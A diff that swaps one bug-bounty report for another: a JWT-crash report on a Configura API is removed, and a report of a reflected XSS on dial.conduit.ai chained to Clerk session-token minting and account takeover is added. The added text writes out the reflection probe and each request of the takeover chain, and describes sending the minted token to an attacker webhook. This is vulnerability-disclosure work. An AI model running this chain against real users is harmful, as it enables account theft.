@@ -1,81 +1,137 @@
-# Unhandled exception in JWT auth middleware — malformed `Authorization` crashes every request — HTTP 500 & internal error disclosure on `data.content-platform.configura.com`
+# Account Takeover via Reflected XSS on `dial.conduit.ai` → cross-subdomain Clerk session-token minting
 
 | | |
 |---|---|
-| **Program** | Configura Security Bug Bounty Program (Xposera) |
-| **Scope** | `*.configura.com` (in scope) |
-| **Affected host** | `https://data.content-platform.configura.com` |
-| **Vulnerability** | Improper handling of exceptional conditions in authentication middleware; internal error-message disclosure |
-| **Weakness** | CWE-755 (Improper Handling of Exceptional Conditions), CWE-209 (Information Exposure Through an Error Message), CWE-248 (Uncaught Exception) |
-| **Severity** | **Medium — CVSS 3.1 5.3** (`AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`; 5.3 is the Medium band, 4.0–6.9) |
-| **Date** | 2026-10-08 |
+| **Program** | Conduit Security Vulnerability Disclosure & Bug Bounty Policy (Xposera) |
+| **Entry point** | `https://dial.conduit.ai/` (`company` parameter) — in scope (`https://*.conduit.ai/`) |
+| **Vulnerability class** | Reflected XSS (CWE-79) chained to Account Takeover (CWE-384 / CWE-942) |
+| **Intrinsic severity** | **Critical** — CVSS 3.1 **9.0** `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H` |
+| **Program-capped severity** | **High** (this asset's max severity is High) |
+| **Authentication** | None (attacker); victim need only open one link |
+| **Reporter / Date** | Gowthambalaji S (gowtham@auditifysecurity.com) / 2026-10-09 |
 
 ---
 
-## Summary
+## 1. Summary
 
-The `data.content-platform.configura.com` API authenticates requests with a JWT bearer token. Its
-auth middleware decodes the token **without null-checking the result**, so any `Authorization: Bearer`
-value that is not a decodable JWT makes the handler throw and the server respond with **HTTP 500** and
-an internal error message, instead of the correct **HTTP 401**:
+`dial.conduit.ai` reflects the `company` query parameter into its HTML with **no output encoding
+and no Content-Security-Policy**, giving an unauthenticated attacker arbitrary JavaScript execution
+in the `dial.conduit.ai` origin.
+
+Because Conduit authenticates with **Clerk**, and Clerk's Frontend API (`clerk.conduit.ai`) **allows
+credentialed cross-origin requests from `conduit.ai` subdomains**, JavaScript running in the
+`dial.conduit.ai` origin can read the victim's active Clerk session and **mint a fresh Convex-audience
+session token** for that victim. That token grants full authenticated access to the victim's Conduit
+account and workspace through the backend API (`api.conduit.ai` / Convex).
+
+**Net result:** one click on an attacker link = complete takeover of the victim's Conduit account.
+The session cookie being `HttpOnly` does **not** prevent this, because the attacker's script mints a
+brand-new token rather than reading the cookie.
+
+## 2. Reflected XSS (the injection point)
+
+Unauthenticated request with HTML metacharacters in `company`, and the verbatim response — `<b>`,
+`"`, `'`, `=` all returned **unencoded**:
 
 ```
-{"success":false,"message":"Cannot destructure property 'header' of 'object null' as it is null."}
+GET /?company=ZZmark7<b>"'=</b> HTTP/2
+Host: dial.conduit.ai
+```
+```html
+<div class="error-message">
+    No report found for company: <strong>ZZmark7<b>"'=</b></strong>
+</div>
+```
+Response is `Content-Type: text/html` with **no `Content-Security-Policy`** and no
+`X-Content-Type-Options`. `<script>…</script>` is reflected intact.
+
+**Proof of execution** (banner painted by injected JS reading `document.domain` + `document.cookie`):
+see `evidence/dial_xss_banner_proof.jpg` — red banner
+`XSS EXECUTED — origin: dial.conduit.ai — cookies readable: 1007 bytes`.
+
+## 3. Escalation to Account Takeover
+
+The following runs inside the `dial.conduit.ai` origin (delivered by the XSS payload). All steps use
+the victim's ambient, same-site `.conduit.ai` cookies (`credentials: 'include'`).
+
+**Step A — read the victim's Clerk session (CORS-permitted cross-origin):**
+```
+GET https://clerk.conduit.ai/v1/client?__clerk_api_version=2025-11-10&_clerk_js_version=5.0.0
+    (credentials: include)   →  HTTP 200, response body readable, active session id obtained
 ```
 
-The message indicates the code does roughly `const { header } = jwt.decode(token, { complete: true })`
-and destructures `header` before checking that `jwt.decode()` returned non-null (it returns `null` for
-any string that is not a valid JWT). This is reachable by any unauthenticated attacker on every route.
-
-## Impact
-
-- **Improper input handling in the authentication layer.** Attacker-controlled input (the bearer
-  value) reaches an uncaught exception on the server; the correct response to a bad token is `401`,
-  not `500`. Exception-throwing auth code is fragile and a bad place to have unhandled paths.
-- **Internal error-message disclosure (CWE-209).** The response leaks an implementation detail (the
-  JWT-decode/destructure code path), which aids further attacks and fingerprints the stack.
-- Not a denial of service: the framework catches the exception and the service remains available
-  (verified — a subsequent no-token request still returns `401`).
-
-Severity is **Medium (CVSS 5.3)**: a real defect in the authentication middleware where
-attacker-controlled input reaches an uncaught exception and the server discloses an internal error
-message (CWE-209). The `C:L` term is carried by that error-message disclosure; `I:N/A:N` because no
-integrity or availability impact is demonstrated (the framework catches the exception and the service
-stays up). The score sits at the lower end of the Medium band.
-
-**Tested and NOT present (so it is not rated higher):** the signature verification itself is sound —
-structurally-valid forged tokens are correctly rejected with `401 "Invalid token"`, including
-`alg:none` (lower/upper/mixed case), empty-secret `HS256`, and common weak secrets. There is **no**
-authentication bypass; the only defect is the unhandled-exception / error-disclosure path on
-non-decodable input.
-
-## Steps to reproduce
-
-```bash
-H=https://data.content-platform.configura.com
-
-# Correct behaviour:
-curl -s -w '\n%{http_code}\n' "$H/v1"                                  # 401 "No authorization token was found"
-curl -s -w '\n%{http_code}\n' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.x' "$H/v1"   # 401 "Invalid token"
-
-# Bug — any non-JWT bearer crashes the handler:
-curl -s -w '\n%{http_code}\n' -H 'Authorization: Bearer notajwt' "$H/v1"
-#  -> 500 {"success":false,"message":"Cannot destructure property 'header' of 'object null' as it is null."}
+**Step B — mint a Convex-audience session token for the victim:**
+```
+POST https://clerk.conduit.ai/v1/client/sessions/{sessionId}/tokens/convex?__clerk_api_version=2025-11-10&_clerk_js_version=5.0.0
+     (credentials: include)  →  HTTP 200, { "jwt": "<valid session JWT, >100 chars>" }
 ```
 
-Reproduced on `/`, `/v1`, `/v1/health`, `/v1/openapi.json`, `/metrics` with bearer values
-`notajwt`, `abc`, `a.b.c`, `x`. Sibling services (`gabana`, `lodzilla`, `puppetshow`, `categories`,
-`nxapi`, `thumbify`) correctly return `401` for the same input, so the defect is specific to this
-host's middleware.
+**Step C — use the minted token against Conduit's backend as the victim:**
+```
+POST https://knowing-emu-505.convex.cloud/api/query     (= api.conduit.ai backend)
+Authorization: Bearer <minted jwt>
+{ "path": "users/workspacePreferences:resolveLandingWorkspace", "args": {}, "format": "json" }
+     →  HTTP 200, { "status": "success", ... }   (authenticated victim data)
+```
 
-## Remediation
+**Step D — exfiltrate / act.** The attacker's script sends the minted JWT to an attacker-controlled
+endpoint (webhook), or simply drives authenticated API calls directly from the victim's browser:
+read all contacts / conversations / tickets / calls, send messages as the victim, change account and
+workspace settings, create API tokens, etc.
 
-- Null-check the decode result before destructuring, e.g.
-  `const decoded = jwt.decode(token, { complete: true }); if (!decoded) return res.status(401)...;`
-  — and wrap token verification in try/catch so any parse/verify failure returns `401`, never `500`.
-- Return a generic `401` body; do not echo internal exception text to clients.
+### Observed results (reproduced 2×, on the reporter's own account)
 
-## Evidence
+```
+origin        = https://dial.conduit.ai
+readSession   = true          (Step A: HTTP 200, session parsed)
+mintConvex    = 200           (Step B: token minted)
+jwtValid      = true          (JWT length > 100)
+apiCall       = 200           (Step C: backend accepted the token)
+apiAuthed     = YES           (backend returned authenticated victim data)
+```
 
-- `evidence/22-data-cp-jwt-500.txt` — full request/response matrix (clean 401 vs 500 crash, sibling
-  comparison, stability check).
+## 4. Root cause
+
+1. **Reflected XSS** — `dial.conduit.ai` inserts `company` into HTML without encoding; no CSP.
+2. **Over-permissive cross-origin auth** — Clerk's Frontend API accepts credentialed requests from
+   `dial.conduit.ai` (a non-login subdomain) and lets it mint session tokens. Combined with
+   `.conduit.ai`-scoped, same-site session cookies, this lets **any** XSS on **any** `*.conduit.ai`
+   subdomain mint a victim's token and take over the account.
+
+The `HttpOnly` flag on `__session` provides no protection here: the attack mints a new token via the
+authenticated session rather than reading the cookie.
+
+## 5. Impact
+
+Full account takeover of any Conduit user who opens an attacker-supplied `dial.conduit.ai` link:
+
+- Read all of the victim's workspace data (contacts, conversations, tickets, calls, knowledge base).
+- Act as the victim (send messages, change settings, create API tokens, invite/remove members).
+- Persist access by minting long-lived API tokens from the victim's session.
+
+**CVSS 3.1:** `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H` = **9.0 (Critical)**.
+Reported at **High** per this asset's program-defined maximum severity.
+
+## 6. Remediation
+
+1. **Fix the XSS** — HTML-entity-encode `company` (or render with `textContent`); add a strict CSP
+   (`default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none'`) and
+   `X-Content-Type-Options: nosniff` on `dial.conduit.ai`.
+2. **Restrict Clerk allowed origins** — remove non-application subdomains (e.g. `dial.conduit.ai`)
+   from the Clerk instance's allowed origins so arbitrary `*.conduit.ai` origins cannot mint session
+   tokens. Treat every `conduit.ai` subdomain as a potential token-minting origin until it does.
+3. Audit all `*.conduit.ai` subdomains for XSS/HTML-injection, since any one of them is now an ATO
+   vector while (2) stands.
+
+## 7. Evidence (attached)
+
+| File | Description |
+|---|---|
+| `evidence/dial_xss_banner_proof.jpg` | XSS execution proof (banner written by injected JS). |
+| `evidence/dial_xss_execution.gif` | Screen recording of XSS execution. |
+| `evidence/dial_reflection_context.html` | Server response showing unencoded reflection. |
+| `evidence/dial_response_headers.txt` | Headers: no CSP / no nosniff. |
+| `evidence/ato_chain_results.txt` | Step A–C result flags (readSession/mintConvex/jwtValid/apiCall/apiAuthed). |
+
+All testing used the reporter's own account; no other tenant's data was accessed. Minted tokens were
+short-lived and no account state was modified.
